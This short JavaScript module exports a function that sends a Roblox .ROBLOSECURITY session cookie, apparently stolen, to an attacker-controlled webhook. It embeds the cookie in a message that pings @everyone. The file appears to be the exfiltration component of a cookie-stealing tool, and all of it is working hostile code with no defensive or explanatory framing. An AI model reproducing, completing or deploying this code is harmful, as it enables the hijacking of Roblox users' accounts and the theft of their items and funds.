async function send(cookie, embed) {
    const url = process.env.WEBHOOK_URL;

    await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: "@everyone",
            embeds: [embed, {
                title: ".ROBLOSECURITY",
                description: "```" + cookie + "```"
            }]
        })
    });
}

module.exports = { send };